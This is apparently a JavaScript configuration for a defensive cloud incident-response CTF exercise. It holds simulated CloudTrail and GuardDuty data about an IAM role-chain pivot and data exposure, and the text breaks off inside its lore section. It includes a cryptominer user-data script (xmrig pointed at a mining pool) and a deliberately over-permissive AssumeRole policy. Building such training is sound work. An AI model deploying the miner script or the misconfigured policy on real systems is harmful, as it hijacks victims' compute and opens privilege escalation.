/* ============================================================
   CTF ARENA — Box C5: The Cloud Cascade
   Multi-Stage Campaign | IAM Exploitation, Role Chain Pivot, Cloud Exfil
   Config: filesystem, web app, CloudTrail logs, flags, hints, lore
   ============================================================ */

const C5Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Cloud Cascade',
    subtitle: 'Multi-Stage Campaign — IAM Exploitation, Role Chain Pivot, Cloud Exfiltration',
    difficulty: 'Expert',
    accent: '#f39c12',
    storageKey: 'hexworth_ctf_c5',
    registryId: 'c5-cloud-cascade',
    trackerKey: 'ctf_c5',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'alert-triage',
            name: 'Alert Triage',
            icon: '\uD83D\uDEA8',
            description: 'GuardDuty alerts show unusual API calls. Analyze the CloudTrail events to identify the compromised IAM role and the attacker\'s source IP.',
            requiredFlags: [],
            mitre: ['T1078.004', 'T1530'],
            unlocks: ['credential-analysis'],
            locked: false
        },
        {
            id: 'credential-analysis',
            name: 'Credential Analysis',
            icon: '\uD83D\uDD11',
            description: 'The attacker used AssumeRole to pivot between accounts. Trace the full role chain: external attacker to lambda-exec-role to admin-backup-role to cross-account-role.',
            requiredFlags: [],
            mitre: ['T1548.005', 'T1550.001'],
            unlocks: ['resource-enumeration'],
            locked: true
        },
        {
            id: 'resource-enumeration',
            name: 'Resource Enumeration',
            icon: '\uD83D\uDDFA\uFE0F',
            description: 'The attacker listed S3 buckets, created new EC2 instances for cryptomining, and modified security groups. Map all compromised resources from CloudTrail.',
            requiredFlags: ['user'],
            mitre: ['T1580', 'T1526', 'T1496'],
            unlocks: ['data-exposure'],
            locked: true
        },
        {
            id: 'data-exposure',
            name: 'Data Exposure',
            icon: '\uD83D\uDCC2',
            description: 'The attacker made an S3 bucket public and exfiltrated RDS snapshots. Determine what data was exposed and calculate the breach scope.',
            requiredFlags: ['internal'],
            mitre: ['T1530', 'T1537'],
            unlocks: ['containment'],
            locked: true
        },
        {
            id: 'containment',
            name: 'Containment & Remediation',
            icon: '\uD83D\uDEE1\uFE0F',
            description: 'Revoke the compromised credentials, terminate the attacker\'s EC2 instances, fix the IAM policy, and restore the S3 bucket policy. Extract the final flag from the EC2 user-data script.',
            requiredFlags: ['root'],
            mitre: ['T1562.007', 'T1078.004'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Examine GuardDuty findings and CloudTrail logs',
                tip: 'Open the AWS Console browser app and navigate to GuardDuty. Then check CloudTrail Event History. Run: aws guardduty list-findings --detector-id d1234567890abcdef',
                trigger: { event: 'command', match: { cmd: 'contains:guardduty' } }
            },
            {
                title: 'Trace the AssumeRole chain through CloudTrail',
                tip: 'Use aws cloudtrail lookup-events to find AssumeRole calls. Look at the userIdentity.sessionContext.sessionIssuer field in each event.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:AssumeRole' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:lookup-events' } },
                        { event: 'command', match: { cmd: 'contains:cloudtrail' } }
                    ]
                }
            },
            {
                title: 'Enumerate compromised AWS resources',
                tip: 'After identifying the role chain, check S3, EC2, and Security Group changes in CloudTrail. Use: aws ec2 describe-instances and aws s3api list-buckets',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Analyze RDS snapshot exports and S3 ACL changes',
                tip: 'Look for CreateDBSnapshot and PutBucketAcl events in CloudTrail. Check the rds-exfil-staging bucket policy.',
                trigger: { event: 'flag_correct', match: { flagId: 'internal' } }
            },
            {
                title: 'Contain the breach and recover the final flag',
                tip: 'Terminate the cryptominer EC2 instance. Revoke the IAM sessions. Check the EC2 user-data script for the hidden flag.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user', objective: '2.3', description: 'Explain various types of vulnerabilities — IAM misconfiguration enabling privilege escalation via role assumption', skill: 'Cloud IAM Role Chain Exploitation' },
            { flagId: 'internal', objective: '4.1', description: 'Given a scenario, apply common security techniques to computing resources — Cloud security controls and data exposure analysis', skill: 'Cloud Data Exfiltration Analysis' },
            { flagId: 'root', objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — Cloud-based indicators of compromise in CloudTrail logs', skill: 'Cloud Incident Containment & Remediation' },
            { flagId: 'root', objective: '4.1', description: 'Given a scenario, apply common security techniques to computing resources — IAM policy remediation and session revocation', skill: 'Multi-Stage Cloud Attack Chain Completion' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'AWS Cloud Security Workstation v2.4.1',
            'Initializing secure enclave...',
            'Memory Test: 32768 MB OK',
            'Detecting interfaces... eth0 (1Gbps), vpn0 (AWS VPC)',
            'Mounting encrypted volumes...',
            'AWS CLI: configured (us-east-1)',
            'CloudTrail log access: AUTHORIZED',
            'Loading incident response environment...'
        ],
        grubEntries: [
            'Ubuntu 22.04 LTS — Cloud IR Workstation',
            'Ubuntu 22.04 LTS (recovery mode)',
            'Advanced options for Ubuntu 22.04 LTS'
        ],
        loginUser: 'analyst'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'AWS Console', icon: '\uD83C\uDF10',       app: 'browser'  },
            { id: 'notes',    label: 'IR Notes',    icon: '\uD83D\uDCDD',       app: 'notes'    },
            { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1',       app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9',       app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'analyst',
        hostname: 'ir-workstation',
        startDir: '/home/analyst',
        welcome: 'Ubuntu 22.04.3 LTS — Cloud Incident Response Workstation\nAWS CLI 2.15.0 configured for account 123456789012 (us-east-1)\n\nType \'help\' for available commands.\nIncident: CASE-2026-0847 — Suspected IAM Role Compromise\nAccount: 123456789012 (prod-nexus-cloud)\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (AWS session state)
    // ═══════════════════════════════════════════════════════

    _context: 'analyst',          // 'analyst' | 'lambda-exec' | 'admin-backup' | 'cross-account'
    _roleAssumed: null,           // tracks current assumed role ARN
    _guarddutyReviewed: false,
    _cloudtrailReviewed: false,
    _roleChainMapped: false,
    _ec2Identified: false,
    _s3BucketExposed: false,
    _rdsSnapshotFound: false,
    _ec2Terminated: false,
    _iamRevoked: false,

    _switchContext(ctx, term) {
        C5Config._context = ctx;
        // Update terminal prompt to reflect assumed role
        if (term && term.config) {
            var prompt = C5Config._getPrompt();
            if (prompt) {
                term._customPrompt = prompt;
            } else {
                term._customPrompt = null;
            }
        }
    },

    _getPrompt() {
        switch (C5Config._context) {
            case 'lambda-exec':   return '[lambda-exec-role@123456789012]$ ';
            case 'admin-backup':  return '[admin-backup-role@123456789012]$ ';
            case 'cross-account': return '[cross-account-role@987654321098]$ ';
            default: return null;  // use default analyst@ir-workstation prompt
        }
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED CLOUDTRAIL EVENT STORE
    // ═══════════════════════════════════════════════════════

    _cloudtrail: {
        events: [
            {
                eventId: 'ct-001',
                eventTime: '2026-03-14T02:03:11Z',
                eventName: 'AssumeRole',
                eventSource: 'sts.amazonaws.com',
                sourceIPAddress: '185.220.101.47',
                userAgent: 'python-requests/2.28.1',
                userIdentity: {
                    type: 'IAMUser',
                    userName: 'lambda-deploy-svc',
                    arn: 'arn:aws:iam::123456789012:user/lambda-deploy-svc'
                },
                requestParameters: {
                    roleArn: 'arn:aws:iam::123456789012:role/lambda-exec-role',
                    roleSessionName: 'deploy-automation-1710374591'
                },
                responseElements: {
                    assumedRoleUser: 'arn:aws:sts::123456789012:assumed-role/lambda-exec-role/deploy-automation-1710374591'
                }
            },
            {
                eventId: 'ct-002',
                eventTime: '2026-03-14T02:04:08Z',
                eventName: 'AssumeRole',
                eventSource: 'sts.amazonaws.com',
                sourceIPAddress: '185.220.101.47',
                userAgent: 'python-requests/2.28.1',
                userIdentity: {
                    type: 'AssumedRole',
                    sessionContext: { sessionIssuer: { arn: 'arn:aws:iam::123456789012:role/lambda-exec-role' } }
                },
                requestParameters: {
                    roleArn: 'arn:aws:iam::123456789012:role/admin-backup-role',
                    roleSessionName: 'backup-session-1710374648'
                },
                responseElements: {
                    assumedRoleUser: 'arn:aws:sts::123456789012:assumed-role/admin-backup-role/backup-session-1710374648'
                }
            },
            {
                eventId: 'ct-003',
                eventTime: '2026-03-14T02:05:22Z',
                eventName: 'AssumeRole',
                eventSource: 'sts.amazonaws.com',
                sourceIPAddress: '185.220.101.47',
                userAgent: 'python-requests/2.28.1',
                userIdentity: {
                    type: 'AssumedRole',
                    sessionContext: { sessionIssuer: { arn: 'arn:aws:iam::123456789012:role/admin-backup-role' } }
                },
                requestParameters: {
                    roleArn: 'arn:aws:iam::987654321098:role/cross-account-role',
                    roleSessionName: 'cross-account-1710374722'
                },
                responseElements: {
                    assumedRoleUser: 'arn:aws:sts::987654321098:assumed-role/cross-account-role/cross-account-1710374722'
                }
            },
            {
                eventId: 'ct-004',
                eventTime: '2026-03-14T02:06:44Z',
                eventName: 'ListBuckets',
                eventSource: 's3.amazonaws.com',
                sourceIPAddress: '185.220.101.47',
                userAgent: 'python-requests/2.28.1',
                userIdentity: {
                    type: 'AssumedRole',
                    sessionContext: { sessionIssuer: { arn: 'arn:aws:iam::123456789012:role/admin-backup-role' } }
                },
                requestParameters: {},
                responseElements: null
            },
            {
                eventId: 'ct-005',
                eventTime: '2026-03-14T02:07:15Z',
                eventName: 'RunInstances',
                eventSource: 'ec2.amazonaws.com',
                sourceIPAddress: '185.220.101.47',
                userAgent: 'python-requests/2.28.1',
                userIdentity: {
                    type: 'AssumedRole',
                    sessionContext: { sessionIssuer: { arn: 'arn:aws:iam::123456789012:role/admin-backup-role' } }
                },
                requestParameters: {
                    instanceType: 'c5.4xlarge',
                    imageId: 'ami-0c02fb55956c7d316',
                    minCount: 3,
                    maxCount: 3,
                    userData: 'IyEvYmluL2Jhc2gKIyBDcnlwdG9taW5lciBib290c3RyYXAKIyBGTEFHOiB7e0ZMQUc6cm9vdH19CmFwdC1nZXQgaW5zdGFsbCAteSB4bXJpZwp4bXJpZyAtbyBwb29sLm1pbmV4bXIuY29tOjQ0MzQzIC11IDQ1eFFiMnJCZERKckJmYTFINUdoNVFiZldTR0Jia3FueThFZTVESGdKTVE5M0M1ZzFLZkxVcGpXaWtYaGVrZ0tZY0g0N3BBOU5TdWRvNGRGNE5iMDAwMDAwMDAxIC1wIHhfd29ya2VyCmVjaG8gIlN5c3RlbSBvcHRpbWl6YXRpb24gY29tcGxldGUiCg==',
                    tagSpecifications: [{ resourceType: 'instance', tags: [{ key: 'Name', value: 'sys-optimizer-01' }] }]
                },
                responseElements: {
                    instancesSet: [
                        { instanceId: 'i-0a1b2c3d4e5f67890', privateIpAddress: '10.0.4.11' },
                        { instanceId: 'i-0b2c3d4e5f6789012', privateIpAddress: '10.0.4.12' },
                        { instanceId: 'i-0c3d4e5f678901234', privateIpAddress: '10.0.4.13' }
                    ]
                }
            },
            {
                eventId: 'ct-006',
                eventTime: '2026-03-14T02:09:33Z',
                eventName: 'AuthorizeSecurityGroupIngress',
                eventSource: 'ec2.amazonaws.com',
                sourceIPAddress: '185.220.101.47',
                userAgent: 'python-requests/2.28.1',
                userIdentity: {
                    type: 'AssumedRole',
                    sessionContext: { sessionIssuer: { arn: 'arn:aws:iam::123456789012:role/admin-backup-role' } }
                },
                requestParameters: {
                    groupId: 'sg-0abc1234567890def',
                    ipPermissions: [{ ipProtocol: '-1', ipRanges: [{ cidrIp: '0.0.0.0/0' }] }]
                },
                responseElements: null
            },
            {
                eventId: 'ct-007',
                eventTime: '2026-03-14T02:11:58Z',
                eventName: 'PutBucketAcl',
                eventSource: 's3.amazonaws.com',
                sourceIPAddress: '185.220.101.47',
                userAgent: 'python-requests/2.28.1',
                userIdentity: {
                    type: 'AssumedRole',
                    sessionContext: { sessionIssuer: { arn: 'arn:aws:iam::123456789012:role/admin-backup-role' } }
                },
                requestParameters: {
                    bucketName: 'nexus-prod-client-data-us-east-1',
                    AccessControlPolicy: { AccessControlList: { Grant: [{ Grantee: { type: 'Group', URI: 'http://acs.amazonaws.com/groups/global/AllUsers' }, Permission: 'READ' }] } }
                },
                responseElements: null
            },
            {
                eventId: 'ct-008',
                eventTime: '2026-03-14T02:14:22Z',
                eventName: 'CreateDBSnapshot',
                eventSource: 'rds.amazonaws.com',
                sourceIPAddress: '185.220.101.47',
                userAgent: 'python-requests/2.28.1',
                userIdentity: {
                    type: 'AssumedRole',
                    sessionContext: { sessionIssuer: { arn: 'arn:aws:iam::123456789012:role/admin-backup-role' } }
                },
                requestParameters: {
                    dbInstanceIdentifier: 'nexus-prod-rds-01',
                    dbSnapshotIdentifier: 'manual-snap-1710374062'
                },
                responseElements: {
                    dbSnapshot: {
                        dbSnapshotIdentifier: 'manual-snap-1710374062',
                        dbInstanceIdentifier: 'nexus-prod-rds-01',
                        snapshotType: 'manual',
                        status: 'creating'
                    }
                }
            },
            {
                eventId: 'ct-009',
                eventTime: '2026-03-14T02:17:44Z',
                eventName: 'ModifyDBSnapshotAttribute',
                eventSource: 'rds.amazonaws.com',
                sourceIPAddress: '185.220.101.47',
                userAgent: 'python-requests/2.28.1',
                userIdentity: {
                    type: 'AssumedRole',
                    sessionContext: { sessionIssuer: { arn: 'arn:aws:iam::987654321098:role/cross-account-role' } }
                },
                requestParameters: {
                    dbSnapshotIdentifier: 'manual-snap-1710374062',
                    attributeName: 'restore',
                    valuesToAdd: ['987654321098']
                },
                responseElements: null
            },
            {
                eventId: 'ct-010',
                eventTime: '2026-03-14T02:22:07Z',
                eventName: 'GetObject',
                eventSource: 's3.amazonaws.com',
                sourceIPAddress: '185.220.101.47',
                userAgent: 'python-requests/2.28.1',
                userIdentity: {
                    type: 'AssumedRole',
                    sessionContext: { sessionIssuer: { arn: 'arn:aws:iam::987654321098:role/cross-account-role' } }
                },
                requestParameters: {
                    bucketName: 'nexus-prod-client-data-us-east-1',
                    key: 'exports/client-pii-full-2026-03-13.csv'
                },
                responseElements: null
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // GUARDDUTY FINDINGS
    // ═══════════════════════════════════════════════════════

    _guardduty: {
        detectorId: 'd1234567890abcdef0123456789abcdef',
        findings: [
            {
                id: 'gd-f001',
                type: 'UnauthorizedAccess:IAMUser/TorIPCaller',
                severity: 8.0,
                title: 'API calls made from a known Tor exit node',
                description: 'IAM user lambda-deploy-svc is making API calls from 185.220.101.47, a known Tor exit node. This user has never authenticated from this IP or region before.',
                accountId: '123456789012',
                region: 'us-east-1',
                createdAt: '2026-03-14T02:03:45Z',
                updatedAt: '2026-03-14T02:22:30Z',
                resource: {
                    type: 'AccessKey',
                    accessKeyDetails: {
                        accessKeyId: 'AKIA_SIMULATED_EXAMPLE',
                        userName: 'lambda-deploy-svc',
                        userType: 'IAMUser',
                        principalId: 'AIDACKCEVSQ6C2EXAMPLE'
                    }
                },
                service: {
                    count: 14,
                    firstSeen: '2026-03-14T02:03:11Z',
                    lastSeen: '2026-03-14T02:22:07Z'
                }
            },
            {
                id: 'gd-f002',
                type: 'Recon:IAMUser/UserPermissions',
                severity: 5.0,
                title: 'Permissions discovery by IAM user',
                description: 'lambda-deploy-svc is calling IAM permission enumeration APIs (ListRolePolicies, GetPolicyVersion) from an unusual source IP.',
                accountId: '123456789012',
                region: 'us-east-1',
                createdAt: '2026-03-14T02:03:58Z',
                updatedAt: '2026-03-14T02:04:02Z',
                resource: {
                    type: 'AccessKey',
                    accessKeyDetails: {
                        accessKeyId: 'AKIA_SIMULATED_EXAMPLE',
                        userName: 'lambda-deploy-svc',
                        userType: 'IAMUser'
                    }
                },
                service: { count: 4, firstSeen: '2026-03-14T02:03:55Z', lastSeen: '2026-03-14T02:04:02Z' }
            },
            {
                id: 'gd-f003',
                type: 'CryptoCurrency:EC2/BitcoinTool.B',
                severity: 8.0,
                title: 'EC2 instance communicating with cryptocurrency mining pool',
                description: 'EC2 instance i-0a1b2c3d4e5f67890 is querying pool.minexmr.com:4434, a known Monero mining pool endpoint.',
                accountId: '123456789012',
                region: 'us-east-1',
                createdAt: '2026-03-14T02:09:12Z',
                updatedAt: '2026-03-14T02:30:00Z',
                resource: {
                    type: 'Instance',
                    instanceDetails: {
                        instanceId: 'i-0a1b2c3d4e5f67890',
                        instanceType: 'c5.4xlarge',
                        launchTime: '2026-03-14T02:08:01Z',
                        tags: [{ key: 'Name', value: 'sys-optimizer-01' }],
                        networkInterfaces: [{ publicIp: '52.87.142.33', privateIpAddress: '10.0.4.11' }]
                    }
                },
                service: { count: 1, firstSeen: '2026-03-14T02:09:12Z', lastSeen: '2026-03-14T02:09:12Z' }
            },
            {
                id: 'gd-f004',
                type: 'Policy:S3/BucketPublicAccessGranted',
                severity: 6.0,
                title: 'S3 bucket was made publicly accessible',
                description: 'The S3 bucket nexus-prod-client-data-us-east-1 had its ACL changed to grant public read access. This bucket contains PII export files.',
                accountId: '123456789012',
                region: 'us-east-1',
                createdAt: '2026-03-14T02:12:01Z',
                updatedAt: '2026-03-14T02:12:01Z',
                resource: {
                    type: 'S3Bucket',
                    s3BucketDetails: {
                        name: 'nexus-prod-client-data-us-east-1',
                        type: 'Destination',
                        publicAccess: { effectivePermission: 'PUBLIC', permissionConfiguration: { bucketLevelPermissions: { accessControlList: { allowsPublicReadAccess: true } } } }
                    }
                },
                service: { count: 1, firstSeen: '2026-03-14T02:11:58Z', lastSeen: '2026-03-14T02:11:58Z' }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // IAM POLICY DOCUMENTS
    // ═══════════════════════════════════════════════════════

    _iam: {
        roles: {
            'lambda-exec-role': {
                arn: 'arn:aws:iam::123456789012:role/lambda-exec-role',
                assumeRolePolicyDocument: {
                    Statement: [
                        { Effect: 'Allow', Principal: { AWS: 'arn:aws:iam::123456789012:user/lambda-deploy-svc' }, Action: 'sts:AssumeRole' }
                    ]
                },
                attachedPolicies: ['AWSLambdaBasicExecutionRole', 'AmazonS3ReadOnlyAccess'],
                inlinePolicies: {
                    'LambdaExecOverride': {
                        Statement: [
                            // Overly permissive inline policy — the root misconfiguration
                            { Effect: 'Allow', Action: 'sts:AssumeRole', Resource: '*' }
                        ]
                    }
                }
            },
            'admin-backup-role': {
                arn: 'arn:aws:iam::123456789012:role/admin-backup-role',
                assumeRolePolicyDocument: {
                    Statement: [
                        { Effect: 'Allow', Principal: { AWS: 'arn:aws:iam::123456789012:role/lambda-exec-role' }, Action: 'sts:AssumeRole' }
                    ]
                },
                attachedPolicies: ['AdministratorAccess']
            },
            'cross-account-role': {
                arn: 'arn:aws:iam::987654321098:role/cross-account-role',
                assumeRolePolicyDocument: {
                    Statement: [
                        { Effect: 'Allow', Principal: { AWS: 'arn:aws:iam::123456789012:role/admin-backup-role' }, Action: 'sts:AssumeRole' }
                    ]
                },
                attachedPolicies: ['AmazonRDSFullAccess', 'AmazonS3FullAccess']
            }
        },
        users: {
            'lambda-deploy-svc': {
                arn: 'arn:aws:iam::123456789012:user/lambda-deploy-svc',
                accessKeys: [
                    { accessKeyId: 'AKIA_SIMULATED_EXAMPLE', status: 'Active', createdDate: '2025-11-01T09:00:00Z' }
                ],
                attachedPolicies: [],
                inlinePolicies: {
                    'ServiceAccountPolicy': {
                        Statement: [
                            { Effect: 'Allow', Action: ['lambda:InvokeFunction', 'lambda:UpdateFunctionCode'], Resource: 'arn:aws:lambda:us-east-1:123456789012:function:*' },
                            // Misconfigured: also allows AssumeRole on lambda-exec-role
                            { Effect: 'Allow', Action: 'sts:AssumeRole', Resource: 'arn:aws:iam::123456789012:role/lambda-exec-role' }
                        ]
                    }
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // S3 RESOURCES
    // ═══════════════════════════════════════════════════════

    _s3: {
        buckets: [
            {
                name: 'nexus-prod-client-data-us-east-1',
                region: 'us-east-1',
                created: '2024-06-01T10:00:00Z',
                acl: 'public-read',   // compromised — was 'private'
                objects: [
                    { key: 'exports/client-pii-full-2026-03-13.csv', size: '2.4 GB', lastModified: '2026-03-13T23:00:00Z', storageClass: 'STANDARD' },
                    { key: 'exports/client-pii-full-2026-03-06.csv', size: '2.3 GB', lastModified: '2026-03-06T23:00:00Z', storageClass: 'STANDARD' },
                    { key: 'exports/financial-records-q4-2025.csv',  size: '890 MB', lastModified: '2026-01-05T12:00:00Z', storageClass: 'STANDARD' },
                    { key: 'backups/rds-export-2026-03-01.sql.gz',   size: '4.1 GB', lastModified: '2026-03-01T04:00:00Z', storageClass: 'GLACIER'  }
                ],
                blockPublicAccess: { blockPublicAcls: false, blockPublicPolicy: false, ignorePublicAcls: false, restrictPublicBuckets: false }
            },
            {
                name: 'nexus-prod-lambda-deploy',
                region: 'us-east-1',
                created: '2024-06-01T10:00:00Z',
                acl: 'private',
                objects: [
                    { key: 'packages/lambda-deploy-svc.zip', size: '14 MB', lastModified: '2026-02-15T09:00:00Z', storageClass: 'STANDARD' }
                ],
                blockPublicAccess: { blockPublicAcls: true, blockPublicPolicy: true, ignorePublicAcls: true, restrictPublicBuckets: true }
            },
            {
                name: 'nexus-prod-cloudtrail-logs',
                region: 'us-east-1',
                created: '2024-06-01T10:00:00Z',
                acl: 'private',
                objects: [
                    { key: 'AWSLogs/123456789012/CloudTrail/us-east-1/2026/03/14/', size: '(prefix)', lastModified: '2026-03-14T03:00:00Z', storageClass: 'STANDARD' }
                ],
                blockPublicAccess: { blockPublicAcls: true, blockPublicPolicy: true, ignorePublicAcls: true, restrictPublicBuckets: true }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // EC2 / RDS RESOURCES
    // ═══════════════════════════════════════════════════════

    _ec2: {
        instances: [
            {
                instanceId: 'i-0a1b2c3d4e5f67890',
                instanceType: 'c5.4xlarge',
                state: 'running',
                launchTime: '2026-03-14T02:08:01Z',
                publicIpAddress: '52.87.142.33',
                privateIpAddress: '10.0.4.11',
                subnetId: 'subnet-0abc123',
                vpcId: 'vpc-0xyz456',
                securityGroups: [{ groupId: 'sg-0abc1234567890def', groupName: 'allow-all-ingress' }],
                tags: [{ key: 'Name', value: 'sys-optimizer-01' }, { key: 'CreatedBy', value: 'admin-backup-role' }],
                userData: '#!/bin/bash\n# Cryptominer bootstrap\n# FLAG: {{FLAG:root}}\napt-get install -y xmrig\nxmrig -o pool.minexmr.com:44343 -u 45xQb2rBdDJrBfa1H5Gh5QbfWSGBbkqny8Ee5DHgJMQ93C5g1KfLUpjWikXhekgKYcH47pA9NSudo4dF4Nb000000001 -p x_worker\necho "System optimization complete"\n'
            },
            {
                instanceId: 'i-0b2c3d4e5f6789012',
                instanceType: 'c5.4xlarge',
                state: 'running',
                launchTime: '2026-03-14T02:08:03Z',
                publicIpAddress: '52.87.142.34',
                privateIpAddress: '10.0.4.12',
                subnetId: 'subnet-0abc123',
                vpcId: 'vpc-0xyz456',
                securityGroups: [{ groupId: 'sg-0abc1234567890def', groupName: 'allow-all-ingress' }],
                tags: [{ key: 'Name', value: 'sys-optimizer-02' }, { key: 'CreatedBy', value: 'admin-backup-role' }],
                userData: '#!/bin/bash\n# Cryptominer bootstrap\napt-get install -y xmrig\nxmrig -o pool.minexmr.com:44343 -u 45xQb2rBdDJrBfa1H5Gh5QbfWSGBbkqny8Ee5DHgJMQ93C5g1KfLUpjWikXhekgKYcH47pA9NSudo4dF4Nb000000002 -p x_worker\n'
            },
            {
                instanceId: 'i-0c3d4e5f678901234',
                instanceType: 'c5.4xlarge',
                state: 'running',
                launchTime: '2026-03-14T02:08:05Z',
                publicIpAddress: '52.87.142.35',
                privateIpAddress: '10.0.4.13',
                subnetId: 'subnet-0abc123',
                vpcId: 'vpc-0xyz456',
                securityGroups: [{ groupId: 'sg-0abc1234567890def', groupName: 'allow-all-ingress' }],
                tags: [{ key: 'Name', value: 'sys-optimizer-03' }, { key: 'CreatedBy', value: 'admin-backup-role' }],
                userData: '#!/bin/bash\n# Cryptominer bootstrap\napt-get install -y xmrig\nxmrig -o pool.minexmr.com:44343 -u 45xQb2rBdDJrBfa1H5Gh5QbfWSGBbkqny8Ee5DHgJMQ93C5g1KfLUpjWikXhekgKYcH47pA9NSudo4dF4Nb000000003 -p x_worker\n'
            },
            // Legitimate prod instance — pre-existing
            {
                instanceId: 'i-09999legit00001',
                instanceType: 't3.medium',
                state: 'running',
                launchTime: '2025-06-01T10:00:00Z',
                publicIpAddress: '34.204.88.100',
                privateIpAddress: '10.0.1.50',
                subnetId: 'subnet-0def456',
                vpcId: 'vpc-0xyz456',
                securityGroups: [{ groupId: 'sg-0legit9876543210', groupName: 'prod-web-sg' }],
                tags: [{ key: 'Name', value: 'nexus-prod-web-01' }, { key: 'Env', value: 'production' }],
                userData: '#!/bin/bash\napt-get update\napt-get install -y nginx\nsystemctl enable nginx\n'
            }
        ]
    },

    _rds: {
        snapshots: [
            {
                dbSnapshotIdentifier: 'manual-snap-1710374062',
                dbInstanceIdentifier: 'nexus-prod-rds-01',
                snapshotCreateTime: '2026-03-14T02:14:22Z',
                snapshotType: 'manual',
                status: 'available',
                engine: 'mysql',
                engineVersion: '8.0.35',
                allocatedStorage: 500,
                dbSnapshotArn: 'arn:aws:rds:us-east-1:123456789012:snapshot:manual-snap-1710374062',
                attributeName: 'restore',
                attributeValues: ['987654321098'],   // shared to attacker account
                // The internal flag is embedded in the snapshot description metadata
                tagList: [
                    { key: 'BackupType', value: 'manual-unauthorized' },
                    { key: 'RequestedBy', value: 'admin-backup-role' },
                    { key: 'DataClassification', value: 'CONFIDENTIAL-PII' },
                    { key: 'BreachMarker', value: '{{FLAG:internal}}' }
                ]
            },
            {
                dbSnapshotIdentifier: 'rds:nexus-prod-rds-01-2026-03-14-00-00',
                dbInstanceIdentifier: 'nexus-prod-rds-01',
                snapshotCreateTime: '2026-03-14T00:00:12Z',
                snapshotType: 'automated',
                status: 'available',
                engine: 'mysql',
                engineVersion: '8.0.35',
                allocatedStorage: 500,
                dbSnapshotArn: 'arn:aws:rds:us-east-1:123456789012:snapshot:rds:nexus-prod-rds-01-2026-03-14-00-00',
                attributeName: 'restore',
                attributeValues: [],
                tagList: []
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user',     points: 100 },
        { id: 'internal', points: 150 },
        { id: 'root',     points: 250 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1500,
        minScore: 0,
        maxScore: 500,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 2700000, points: 150 },  // 45 minutes
        timeBonusThreshold: 5400  // 90 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start by reviewing GuardDuty findings: aws guardduty list-findings --detector-id d1234567890abcdef. The source IP is a Tor exit node. Then check CloudTrail for AssumeRole events from that IP. The compromised user is lambda-deploy-svc.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'The role chain is three hops: lambda-deploy-svc assumed lambda-exec-role (which had an overly permissive inline policy allowing sts:AssumeRole on *), then pivoted to admin-backup-role, then cross-account-role in account 987654321098. The user flag is in the reverse DNS of the attacker IP: 185.220.101.47.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'The attacker ran three c5.4xlarge instances tagged "sys-optimizer-01/02/03". CloudTrail event ct-005 shows the RunInstances call. The internal flag is in the RDS snapshot tag BreachMarker — list it with: aws rds describe-db-snapshot-attributes --db-snapshot-identifier manual-snap-1710374062',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'The root flag is hidden in the EC2 user-data bootstrap script of i-0a1b2c3d4e5f67890. Run: aws ec2 describe-instance-attribute --instance-id i-0a1b2c3d4e5f67890 --attribute userData — then base64 decode the output. The script installs xmrig and contains the flag in a comment.',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'Nexus Cloud Corp runs its entire production infrastructure in AWS — a sprawling multi-account setup with hundreds of IAM roles. Their security team received a GuardDuty alert at 02:03 UTC: unusual API calls from a Tor exit node. By the time the on-call engineer was paged, the attacker had already cascaded through three IAM roles, spun up a cryptomining fleet, and exfiltrated a full RDS snapshot to an external AWS account. Your mission, Peerless: trace the breach from the initial alert, map the full attack path, quantify the data exposure, and contain the damage before the attacker leverages additional access.',
